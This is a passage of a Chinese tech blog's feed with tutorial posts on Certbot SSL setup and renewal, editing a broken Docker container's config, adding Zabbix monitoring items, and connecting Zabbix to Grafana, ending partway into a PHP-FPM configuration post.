包的好处就是它解决了应用程序之间的依赖问题，使应用程序之间更容易管理。但是由此带来的问题就是它占用更多的磁盘空间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt update</span><br><span class="line">$ sudo apt install snapd</span><br></pre></td></tr></table></figure><h4 id="2-安装-certbot"><a href="#2-安装-certbot" class="headerlink" title="2. 安装 certbot"></a>2. 安装 certbot</h4><p>在安装 Certbot 之前，最好先移除历史快照。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get remove certbot</span><br></pre></td></tr></table></figure><p>进行安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo snap install --classic certbot</span><br></pre></td></tr></table></figure><h4 id="3-生成证书"><a href="#3-生成证书" class="headerlink" title="3. 生成证书"></a>3. 生成证书</h4><p>安装完成之后，下一步需要做的就是生成证书了，这里有两种方式：</p><ol><li><p>生成证书并自动配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo certbot --nginx</span><br></pre></td></tr></table></figure></li><li><p>生成证书手动配置</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo certbot certonly --nginx</span><br></pre></td></tr></table></figure><p>我选择的是手动配置，大概流程如下：</p><ol><li>输入常用邮箱，用来接收通知和恢复密钥。</li><li>同意使用协议。</li><li>输入需要做授权的域名，多个域名用空格隔开。</li><li>等待验证通过。</li></ol><p>需要注意的是：</p><ol><li><code>certbot</code>会自动检测本地Nginx 的可用域名（没有配置server_name 的域名不会被检测到）</li><li>如果其中某个域名验证失败，则不会生成密钥及证书</li></ol><p>一切正常的话，可以看到<code>/etc/letsencrypt/live/your_sites/</code>目录下多了四个文件：</p><ul><li><code>cert.pem</code> ： 公钥，服务器证书</li><li><code>chain.pem</code> ： 中间证书</li><li><code>fullchain.pem</code> ： 前两个的合集</li><li><code>privkey.pem</code> ： 私钥</li></ul><p>其中配置Nginx SSL 只需要用到<code>fullchain.pem</code> 和<code>privkey.pem</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       443 ssl;</span><br><span class="line">    server_name www.example.com;</span><br><span class="line"></span><br><span class="line">    ssl on;</span><br><span class="line">    ssl_certificate &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;www.exampl.com&#x2F;fullchain.pem;</span><br><span class="line">    ssl_certificate_key &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;www.example.com&#x2F;privkey.pem;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，就已经完成了生成证书到配置的全部过程了。</p><h3 id="自动续签"><a href="#自动续签" class="headerlink" title="自动续签"></a>自动续签</h3><p>如果快要到期了，可以使用<code>certbot renew</code>对证书进行更新，需要注意的是，如果证书尚未过期，则不会更新。</p><p>可以配合<code>conrtab</code>使用，每半个月的凌晨三点自动续签一次。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ 0 3 15 * * certbot renew</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://blog.cngal.org/index.php?controller=post&action=view&id_post=10" target="_blank" rel="noopener">Let’s Encrypt免费SSL证书获取以及自动续签</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;上次介绍了如何通过第三方网站申请免费的SSL 证书，但有效期只有三个月，三个月之后又需要再次申请，记得还好，如果忘了可能还会造成不必要的损失。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    
    <category term="HTTPS" scheme="https://www.0x2beace.com/tags/HTTPS/"/>
    
    <category term="SSL" scheme="https://www.0x2beace.com/tags/SSL/"/>
    
    <category term="HTTP" scheme="https://www.0x2beace.com/tags/HTTP/"/>
    
    <category term="Certbot" scheme="https://www.0x2beace.com/tags/Certbot/"/>
    
  </entry>
  
  <entry>
    <title>当 Docker 容器无法正常启动时如何修改配置文件</title>
    <link href="https://www.0x2beace.com/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally-1/"/>
    <id>https://www.0x2beace.com/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally-1/</id>
    <published>2020-09-10T13:12:13.000Z</published>
    <updated>2020-09-10T13:13:32.922Z</updated>
    
    <content type="html"><![CDATA[<p>在容器无法正常启动的情况下，如何修改其配置文件？</p><p>问题描述：因为错误的配置文件导致容器运行异常，无法正常启动，通常情况下只有进入容器才能修改配置文件，所以在不能进入容器的情况下该怎么办呢？</p><a id="more"></a><p>这种情况下，有两种方式去修改：<br>2. Docker 容器的配置文件一般在 <code>/var/lib/docker/overlay/</code>目录下，可以找到该目录下对应的配置文件进行修改。<br>2. 把容器中的配置文件复制到主机中，修改完之后，再移动到容器中。</p><h2 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h2><ol><li><p>查询日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker logs &lt;容器名称&#x2F;容器id&gt;</span><br><span class="line"></span><br><span class="line">ERROR: mysqld failed while attempting to check config</span><br><span class="line">command was: &quot;mysqld --verbose --help&quot;</span><br><span class="line">2020-09-03T12:15:54.644699Z 0 [ERROR] unknown variable &#39;realy-log&#x3D;slave-relay-bin&#39;</span><br><span class="line">2020-09-03T12:15:54.650119Z 0 [ERROR] Aborting</span><br></pre></td></tr></table></figure><p>由于异常日志可以得知是因为我将<code>relay-log</code> 写成了 <code>realy</code> 导致容器无法正常启动。</p></li><li><p>查找文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ find &#x2F; -name mysqld.cnf</span><br><span class="line"></span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;merged&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;4f128d7fb1200f722b0d2cfe3606149fe72987a7a16bc78551a2b1fe6c6c6572&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;a68f1af4adf982b037f1bd37d61082fde1fa2b0e26ea0e2fe146edcb69b198ea&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure><p>这里可能会出现多个配置文件，这是因为每一次重启Mysql 容器都会保留一个配置文件，所以理论上，直接修改第一个配置文件，就是当前Mysql 所使用的配置文件。</p></li><li><p>修改配置文件</p></li><li><p>重启容器即可。</p></li></ol><h2 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h2><p>如果第一种方式没生效，那可以尝试第二种方式。</p><ol><li><p>复制容器中的配置文件到主机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 语法：docker cp &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt; &lt;需要复制到主机的路径&gt;</span><br><span class="line"></span><br><span class="line">$ docker cp mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf ~&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure></li><li><p>修改主机中的配置文件</p></li><li><p>将该配置文件mv 到容器中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 语法：docker cp &lt;配置文件在主机中的路径&gt; &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt;</span><br><span class="line"></span><br><span class="line">$ docker cp ~&#x2F;mysqld.cnf mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure></li><li><p>重启配置文件即可。</p></li></ol><p>总结：两种方式均可以有效解决上述问题，当然这类方式仅适用于容器是因错误的配置文件导致无法正常启动的情况。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/LinHenk/article/details/88111616" target="_blank" rel="noopener">Docker修改无法启动的容器的配置文件</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在容器无法正常启动的情况下，如何修改其配置文件？&lt;/p&gt;
&lt;p&gt;问题描述：因为错误的配置文件导致容器运行异常，无法正常启动，通常情况下只有进入容器才能修改配置文件，所以在不能进入容器的情况下该怎么办呢？&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Docker" scheme="https://www.0x2beace.com/categories/Linux/Docker/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Docker" scheme="https://www.0x2beace.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Zabbix 快速上手——添加监控项</title>
    <link href="https://www.0x2beace.com/zabbix-quick-start-add-monitoring-items/"/>
    <id>https://www.0x2beace.com/zabbix-quick-start-add-monitoring-items/</id>
    <published>2020-09-09T13:50:15.000Z</published>
    <updated>2020-09-09T13:51:50.880Z</updated>
    
    <content type="html"><![CDATA[<p>在Zabbix 默认的监控项中，唯独没有网络状态的监控，而网络状况的监控又是我最关心的，所以需要自己手动添加。</p><p>下面介绍的方式仅适合主机数量不多的情况手动添加，如果主机数量很多，使用这种方式会很繁琐低效。</p><a id="more"></a><p>至于更好的方式是怎样的，暂时还没有发现。</p><h2 id="添加监控项"><a href="#添加监控项" class="headerlink" title="添加监控项"></a>添加监控项</h2><p>打开<code>Configuration-&gt;Hosts</code> 主机页面，点击需要监控项的主机的 <code>Application</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908202935.png" alt=""></p><p>在<code>Application</code>列表中，如果没有看到 <code>Network interfaces</code>这一项，那么可以点击右上角的<code>Create Appliction</code>自己创建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908203206.png" alt=""></p><p>创建完成之后，<code>items</code> 默认是没有的，需要我们自己添加，继续点击<code>items-&gt;create items</code>。</p><p>接下来是最重要的一步，添加监控项的具体信息。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908203720.png" alt=""></p><p>需要注意的地方有下面几个：</p><ul><li>Name：自定义该项监控的名称</li><li>Key：<code>net.if.in[eth0,bytes]</code>，其中<code>eth0</code>并不是固定的，这个具体的值是被监控得主机得实际网卡。</li><li>Units：<code>bps</code></li><li>Update interval：自动更新时间，这个可以自定义。</li><li>Applications：选择 <code>Network interfaces</code></li></ul><blockquote><p>如何确定网卡地址？</p></blockquote><p>进入服务器，输入<code>ifconfig</code>命令查看，通常排在最前面得就是实际网卡。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908205948.png" alt=""></p><p>完成之后，点击<code>Add</code>添加监控项。</p><p>如果一切顺利的话，可以在刚才添加的监控项列表中看到监控项状态是启用的。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908204614.png" alt=""></p><p>这个时候已经可以看到该监控项相关的数据了，如果希望在Grafana 中展示，那么只需要在选择Application时，选择<code>Network interfaces</code>就好了。</p><p>结合Grafana，最后的效果大概是这样：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908205451.png" alt=""></p><p>这里只是举了一个典型的例子来了解Zabbix 如何手动添加监控项，其他类型的数据也是通过类似的方式进行添加。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/smail-bao/p/6109882.html" target="_blank" rel="noopener">zabbix监控网络的出入口流量</a></li><li><a href="https://pdf-lib.org/Home/Details/3901" target="_blank" rel="noopener">Cannot find information for this network interface in /proc/net/dev</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在Zabbix 默认的监控项中，唯独没有网络状态的监控，而网络状况的监控又是我最关心的，所以需要自己手动添加。&lt;/p&gt;
&lt;p&gt;下面介绍的方式仅适合主机数量不多的情况手动添加，如果主机数量很多，使用这种方式会很繁琐低效。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Zabbix" scheme="https://www.0x2beace.com/categories/Linux/Zabbix/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Zabbix" scheme="https://www.0x2beace.com/tags/Zabbix/"/>
    
  </entry>
  
  <entry>
    <title>Zabbix + Grafana 打造高颜值的分布式监控平台</title>
    <link href="https://www.0x2beace.com/zabbix-grafana-to-create-a-high-value-distributed-monitoring-platform/"/>
    <id>https://www.0x2beace.com/zabbix-grafana-to-create-a-high-value-distributed-monitoring-platform/</id>
    <published>2020-09-08T13:08:25.000Z</published>
    <updated>2020-09-08T13:09:34.991Z</updated>
    
    <content type="html"><![CDATA[<p>在前面了解了如何部署 Zabbix，众所周知Zabbix 的部署并不是难的部分，配置才是最难的那部分。</p><p>所以如何获取到想要的那部分数据，将那部分数据以更直观的方式展现出来，这才是我们更关心的。</p><p>Zabbix 默认有自己的 Graphs，但是并不好用，所以使用Zabbix + Grafana 打造高颜值的分布式监控平台才是最好的选择。</p><a id="more"></a><h2 id="Grafana-是什么？"><a href="#Grafana-是什么？" class="headerlink" title="Grafana 是什么？"></a>Grafana 是什么？</h2><blockquote><p>Grafana是一个跨平台的开源度量分析和可是化的工具，可以通过该将采集的数据查询然后可视化的展示，并及时通知。</p></blockquote><p>Grafana 有以下特点：</p><ol><li>展示方式：快速灵活的客户端图表，面板插件有许多不同方式的可视化指标和日志，官方库中具有丰富的仪表盘插件，比如热图、折线图、图表等多种展示方式.</li><li>数据源：Graphite、InfluxDB、OpenTSDB、Prometheus、Elasticsearch、CloudWatch和KairosDb、Zabbix等。</li><li>通知提醒：以可视方式定义最重要指标的报警规则，Grafana将不断计算并发送通知，在数据达到预设阈值时通过slack，PagerDuty等处理通知。</li><li>混合展示：在同一图表中混合使用不同的数据源，可以基于每个查询指定数据源，甚至自定义数据源。</li><li>注释：使用来自不同数据源的丰富事件来展示图表，将鼠标悬停在事件上会显示完整的事件元数据和标记。</li><li>过滤器：Ad-hoc过滤器允许动态创建新的键/值过滤器，这些过滤器会自动应用于使用该数据源的所有查询。</li></ol><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Grafana 的安装还是建议根据自己实际的系统环境去<a href="https://grafana.com/grafana/download/7.0.0" target="_blank" rel="noopener">官网</a>选择适合自己的下载链接。</p><p>比如我的环境是 Ubuntu 18.04，我想安装 Grafana 7.0，所以我的安装方式应该是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install -y adduser libfontconfig1</span><br><span class="line">$ wget https:&#x2F;&#x2F;dl.grafana.com&#x2F;oss&#x2F;release&#x2F;grafana_7.0.0_amd64.deb</span><br><span class="line">$ sudo dpkg -i grafana_7.0.0_amd64.deb</span><br></pre></td></tr></table></figure><h3 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h3><p>以守护进程的方式启动 <code>grafana-server</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl daemon-reload</span><br><span class="line">$ sudo systemctl start grafana-server</span><br></pre></td></tr></table></figure><p>设置开机启动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl enable grafana-server.service</span><br></pre></td></tr></table></figure><p>查看 <code>grafana-server</code>所监听的端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo netstat -lntp</span><br><span class="line">tcp6       0      0 :::3000                 :::*                    LISTEN      17194&#x2F;grafana-serve</span><br></pre></td></tr></table></figure><p>3000 是Grafana 默认监听端口，然后通过浏览器访问 <code>http://your_ip_address:3000</code> 即可。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200907174006.png" alt=""></p><p>正常应该可以看到该页面，如果你能看到3000 端口被监听，但是页面一直打不开，那可能是因为防火墙没有允许3000 端口。</p><p>默认的用户名和密码都是：admin，登录之后记得第一时间修改默认密码。</p><h3 id="安装Zabbix-插件"><a href="#安装Zabbix-插件" class="headerlink" title="安装Zabbix 插件"></a>安装Zabbix 插件</h3><p>打开Grafana 的插件列表，找到<a href="https://grafana.com/grafana/plugins/alexanderzobnin-zabbix-app" target="_blank" rel="noopener">Zabbix</a>。</p><p>这里根据实实际情况，选择对应的版本。</p><p>通过<code>grafana-cli</code> 安装zabbix 插件，将下面这行代码放在安装了 Grafana 的服务器上执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ grafana-cli plugins install alexanderzobnin-zabbix-app</span><br><span class="line">✔ Installed alexanderzobnin-zabbix-app successfully</span><br></pre></td></tr></table></figure><p>安装完成之后，重启Grafana：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl restart grafana-server</span><br></pre></td></tr></table></figure><p>然后打开Grafana 的Web 界面，在插件列表中找到 Zabbix。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200907175149.png" alt=""></p><p>点击启用。</p><h3 id="add-data-source"><a href="#add-data-source" class="headerlink" title="add data source"></a>add data source</h3><p>自从 Grafana 7.0 以后，没有签名的插件默认在 datasource 中是不可见的…</p><p>坑啊，最初我安装的是 Zabbix5.0，然后看见Grafana 7.0 好像只适配4.0，心想完了，该不会出现什么版本不兼容的问题吧？</p><p>结果在<code>add data source</code>这一步，一直找不到 zabbix…</p><p>然后今天把5.0 完全卸载了，重新装回了4.0，结果到了<code>add data source</code>这一步才发现，还是找不到zabbix，当时心态就崩了…</p><p>直到我看见<a href="https://sbcode.net/zabbix/grafana-zabbix-plugin/" target="_blank" rel="noopener">这篇文章</a>，这么重要的信息，官方文档中居然没记录。</p><p>如果你无法访问，也可以直接进行修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;grafana&#x2F;grafana.ini</span><br><span class="line"></span><br><span class="line"># 添加一行</span><br><span class="line">allow_loading_unsigned_plugins &#x3D; alexanderzobnin-zabbix-datasource</span><br></pre></td></tr></table></figure><p>然后重启Grafana：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl restart grafana-server</span><br></pre></td></tr></table></figure><p>再次打开Web 页面，现在就能找到 Zabbix 了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200907181658.png" alt=""></p><h3 id="配置-data-source"><a href="#配置-data-source" class="headerlink" title="配置 data source"></a>配置 data source</h3><p>只用修改以下四个地方就好了，然后点击保存。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200907203549.png" alt=""></p><h3 id="add-dashboard"><a href="#add-dashboard" class="headerlink" title="add dashboard"></a>add dashboard</h3><p>依次点击<code>add dashboard-&gt; add new panel</code>，然后按照以下方式配置，就可以选择展示自己想要的数据了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200907204758.png" alt=""></p><p>最后的效果：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200907204326.png" alt=""></p><p>这里只是介绍了 Zabbix + Grafana 最基础的用法，能看到的数据也是最简单的一些，如果想看到更多的数据，那就得更加了解 Zabbix 了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在前面了解了如何部署 Zabbix，众所周知Zabbix 的部署并不是难的部分，配置才是最难的那部分。&lt;/p&gt;
&lt;p&gt;所以如何获取到想要的那部分数据，将那部分数据以更直观的方式展现出来，这才是我们更关心的。&lt;/p&gt;
&lt;p&gt;Zabbix 默认有自己的 Graphs，但是并不好用，所以使用Zabbix + Grafana 打造高颜值的分布式监控平台才是最好的选择。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Zabbix" scheme="https://www.0x2beace.com/categories/Linux/Zabbix/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Zabbix" scheme="https://www.0x2beace.com/tags/Zabbix/"/>
    
  </entry>
  
  <entry>
    <title>当 Docker 容器无法正常启动时如何修改配置文件？</title>
    <link href="https://www.0x2beace.com/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally/"/>
    <id>https://www.0x2beace.com/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally/</id>
    <published>2020-09-07T00:13:24.000Z</published>
    <updated>2020-09-07T00:14:53.536Z</updated>
    
    <content type="html"><![CDATA[<p>在容器无法正常启动的情况下，如何修改其配置文件？</p><a id="more"></a><p>问题描述：因为错误的配置文件导致容器运行异常，无法正常启动，通常情况下只有进入容器才能修改配置文件，所以在不能进入容器的情况下该怎么办呢？</p><p>这种情况下，有两种方式去修改：<br>2. Docker 容器的配置文件一般在 <code>/var/lib/docker/overlay/</code>目录下，可以找到该目录下对应的配置文件进行修改。<br>2. 把容器中的配置文件复制到主机中，修改完之后，再移动到容器中。</p><h2 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h2><ol><li><p>查询日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker logs &lt;容器名称&#x2F;容器id&gt;</span><br><span class="line"></span><br><span class="line">ERROR: mysqld failed while attempting to check config</span><br><span class="line">command was: &quot;mysqld --verbose --help&quot;</span><br><span class="line">2020-09-03T12:15:54.644699Z 0 [ERROR] unknown variable &#39;realy-log&#x3D;slave-relay-bin&#39;</span><br><span class="line">2020-09-03T12:15:54.650119Z 0 [ERROR] Aborting</span><br></pre></td></tr></table></figure><p>由于异常日志可以得知是因为我将<code>relay-log</code> 写成了 <code>realy</code> 导致容器无法正常启动。</p></li><li><p>查找文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ find &#x2F; -name mysqld.cnf</span><br><span class="line"></span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;merged&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;4f128d7fb1200f722b0d2cfe3606149fe72987a7a16bc78551a2b1fe6c6c6572&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;a68f1af4adf982b037f1bd37d61082fde1fa2b0e26ea0e2fe146edcb69b198ea&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure><p>这里可能会出现多个配置文件，这是因为每一次重启Mysql 容器都会保留一个配置文件，所以理论上，直接修改第一个配置文件，就是当前Mysql 所使用的配置文件。</p></li><li><p>修改配置文件</p></li><li><p>重启容器即可。</p></li></ol><h2 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h2><p>如果第一种方式没生效，那可以尝试第二种方式。</p><ol><li><p>复制容器中的配置文件到主机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 语法：docker cp &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt; &lt;需要复制到主机的路径&gt;</span><br><span class="line"></span><br><span class="line">$ docker cp mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf ~&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure></li><li><p>修改主机中的配置文件</p></li><li><p>将该配置文件mv 到容器中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 语法：docker cp &lt;配置文件在主机中的路径&gt; &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt;</span><br><span class="line"></span><br><span class="line">$ docker cp ~&#x2F;mysqld.cnf mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure></li><li><p>重启配置文件即可。</p></li></ol><p>总结：两种方式均可以有效解决上述问题，当然这类方式仅适用于容器是因错误的配置文件导致无法正常启动的情况。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/LinHenk/article/details/88111616" target="_blank" rel="noopener">Docker修改无法启动的容器的配置文件</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在容器无法正常启动的情况下，如何修改其配置文件？&lt;/p&gt;</summary>
    
    
    
    <category term="Docker" scheme="https://www.0x2beace.com/categories/Docker/"/>
    
    
    <category term="Docker" scheme="https://www.0x2beace.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>PHP-FPM 配置初始化</title>
    <link href="https://www.0x2beace.com/php-fpm-configuration-initialization/"/>
    <id>https://www.0x2beace.com/php-fpm-configuration-initialization/</id>
    <published>2020-09-06T03:57:11.000Z</published>
    <updated>2020-09-06T04:05:33.658Z</updated>
    
    <content type="html"><![CDATA[<p><code>php-fpm</code>（FastCGI Process Manger）是一个PHP FastCGI 管理器，专门和Nginx 的 <code>ngx_fastcgi_modul</code>模块对接，用来处理动态请求。</p><a id="more"></a><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>当安装了PHP 之后，可以从以下三个方向来对默认配置进行修改，以达到优化的效果。</p><h3 id="1-核心配置文件"><a href="#1-核心配置文件" class="headerlink" title="1. 核心配置文件"></a>1. 核心配置文件</h3><p>核心配置文件其实就是 <code>php.ini</code>，该配置文件的作用通常是用来启用或禁用第三方模块，及修改PHP 时区等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini</span><br><span class="line"></span><br><span class="line">date.timezone &#x3D; Asia&#x2F;Shanghai</span><br></pre></td></tr></table></figure><h3 id="2-全局配置文件"><a href="#2-全局配置文件" class="headerlink" title="2. 全局配置文件"></a>2. 全局配置文件</h3><p>全局配置文件<code>php-fpm.conf</code>，通常用来配置一些辅助性功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># vim 